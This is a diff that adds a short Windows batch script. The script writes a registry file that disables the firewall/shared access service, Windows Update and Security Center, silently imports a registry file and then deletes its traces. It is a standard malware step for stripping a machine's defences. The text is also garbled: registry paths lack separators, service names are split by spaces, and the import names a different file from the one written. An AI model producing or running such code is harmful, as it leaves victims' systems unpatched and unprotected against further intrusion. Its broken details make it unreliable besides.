@@ -1,0 +1,13 @@
+>"%Temp%.disfire.reg" ECHO REGEDIT4
+>>"%Temp%.disfire.reg" ECHO.
+>>"%Temp%.disfire.reg" ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesS haredAccess]
+>>"%Temp%.disfire.reg" ECHO "Start"=dword:00000004
+>>"%Temp%.disfire.reg" ECHO.
+>>"%Temp%.disfire.reg" ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesw uauserv]
+>>"%Temp%.disfire.reg" ECHO "Start"=dword:00000004
+>>"%Temp%.disfire.reg" ECHO.
+>>"%Temp%.disfire.reg" ECHO [HKEY_LOCAL_MACHINESYSTEMControlSet001Serviceswscsv c]
+>>"%Temp%.disfire.reg" ECHO "Start"=dword:00000004
+>>"%Temp%.disfire.reg" ECHO.
+START /WAIT REGEDIT /S "%Temp%.kill.reg"
+del "%Temp%.disfire.reg"
